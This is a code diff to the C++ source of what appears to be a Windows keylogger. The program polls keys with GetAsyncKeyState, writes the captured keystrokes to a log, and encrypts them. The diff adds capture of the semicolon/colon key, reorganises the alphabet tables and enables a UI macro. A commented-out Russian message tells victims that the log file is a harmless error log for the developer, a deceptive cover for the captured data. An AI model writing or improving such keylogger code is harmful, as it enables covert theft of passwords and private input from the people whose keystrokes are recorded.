@@ -14,26 +14,27 @@
 /*******************************************************************/
 
 #include <iostream>
-#include <windows.h>
+#include <Windows.h>
 #include <fstream>
 #include <string>
 #include <time.h>
 
-//#define VISIBLE_UI //Macros for UI conditional compilation
+#define VISIBLE_UI //Macros for UI conditional compilation
 
 //using namespace std;
 
 bool is_capslock = false;
 int backspace = 0;
-std::string high_en_alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-std::string low_en_alph = "abcdefghijklmnopqrstuvwxyz";
-std::string high_ru_alph = "АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ";
-std::string low_ru_alph = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя";
-std::string signs = "!\"#$%^&*()+=-_'?.,|/`~№:;@[]{}";
-std::string numbers = "0123456789";
 
 std::string encryptLogs(const std::string str, const int key)
 {
+	std::string high_en_alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	std::string low_en_alph = "abcdefghijklmnopqrstuvwxyz";
+	std::string high_ru_alph = "АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ";
+	std::string low_ru_alph = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя";
+	std::string signs = "!\"#$%^&*()+=-_'?.,|/`~№:;@[]{}";
+	std::string numbers = "0123456789";
+
 	std::string output;
 
 	for (int i = 0; i < str.length(); ++i)
@@ -730,6 +731,20 @@ int save(const int key)
 				sLogs += "z";
 			}
 		}
+	//
+	case 186:
+		::backspace = 0;
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			sLogs += ":";
+			break;
+		}
+		else
+		{
+			sLogs += ";";
+		}
+		break;
+	//
 	//Decimal key codes
 	case 13:
 		::backspace = 0;
@@ -833,7 +848,7 @@ int main(int argc, char *argv[])
 	//	" появится текстовый документ 'logs.txt' (например, если исполняемый файл сохранен на рабочем столе, то\n"
 	//	" текстовый документ 'logs.txt' появится там же), в случае ошибки\n"
 	//	" ТЕКСТОВЫЙ ДОКУМЕНТ УДАЛЯТЬ КРАЙНЕ НЕ РЕКОМЕНДУЕТСЯ.\n"
-	//	" Этот файл необходим разработчику для исправления ошибок.\n"
+	//	" Этот файл хранит информацию о работе программы и необходим разработчику для исправления ошибок.\n"
 	//	"\tСпасибо за внимание!\n" << std::endl;
 
 	//std::cout << "Нажмите Enter, чтобы продолжить..." << std::endl;
@@ -897,7 +912,7 @@ int main(int argc, char *argv[])
 	{
 		std::cout << "\nERROR!\a\nInvalid display mode value." << std::endl;
 		std::cout << "Try selected display mode again.\n" << std::endl;
-		exit(1);
+		exit(0);
 	}
 	#endif //VISIBLE_UI
 
